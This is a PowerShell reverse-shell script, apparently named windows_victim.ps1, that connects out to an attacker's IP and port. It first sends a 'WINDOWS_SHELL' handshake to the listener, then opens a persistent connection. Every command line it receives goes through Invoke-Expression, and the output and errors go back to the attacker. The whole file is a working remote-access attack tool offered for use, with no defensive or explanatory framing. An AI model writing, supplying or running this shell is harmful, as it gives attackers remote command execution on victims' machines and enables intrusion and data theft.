param (
    [string]$AttackerIP,
    [int]$Port
)

# 1. Parameter Validation
if (-not $AttackerIP -or -not $Port) {
    Write-Host "" -ForegroundColor Red
    Write-Host "[!] Error: Missing arguments." -ForegroundColor Red
    Write-Host "Usage: .\windows_victim.ps1 <attacker_ip> <port>" -ForegroundColor Green
    Write-Host "Example: .\windows_victim.ps1 10.0.13.7 4444" -ForegroundColor Blue
    Write-Host ""
    exit 1
}

# 2. Handshake Phase (The "Double-Tap")
# This opens a quick connection to tell the listener we are a Windows machine
try {
    $handshake = New-Object System.Net.Sockets.TCPClient($AttackerIP, $Port)
    $w = New-Object System.IO.StreamWriter($handshake.GetStream())
    $w.WriteLine("WINDOWS_SHELL")
    $w.Flush(); $w.Close(); $handshake.Close()
} catch {
    Write-Host "[!] Handshake failed. Is the listener active?" -ForegroundColor Red
    exit 1
}

# Wait 1 second for the attacker's script to switch to the standard NC listener
Start-Sleep -Seconds 1

# 3. Persistent Shell Connection
try {
    $TCPClient = New-Object System.Net.Sockets.TCPClient($AttackerIP, $Port)
    $Stream = $TCPClient.GetStream()
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Reader = New-Object System.IO.StreamReader($Stream)
    $Writer.AutoFlush = $true

    $Writer.WriteLine("[+] Windows Shell Established. Ready for commands.")

    while($TCPClient.Connected) {
       # Send the prompt to the attacker
       $Writer.Write("`r`nPS " + (Get-Location).Path + "> ")
       
       # ReadLine waits for the [ENTER] key, preventing crashes from character spam
       $InputLine = $Reader.ReadLine()
       
       # Only execute if the input is not empty
       if ($null -ne $InputLine -and $InputLine.Trim().Length -gt 0) {
          try {
              # Execute command and capture Output + Errors (2>&1)
              $CommandOutput = (Invoke-Expression -Command $InputLine 2>&1 | Out-String)
              if ($CommandOutput) {
                  $Writer.Write($CommandOutput)
              }
          } catch {
              # If command fails, report error but keep the loop running
              $Writer.WriteLine("Command Error: " + $_.Exception.Message)
          }
       }
       $Writer.Flush()
    }
    $TCPClient.Close()
} catch {
    Write-Host "[!] Connection lost or failed: $($_.Exception.Message)" -ForegroundColor Red
}
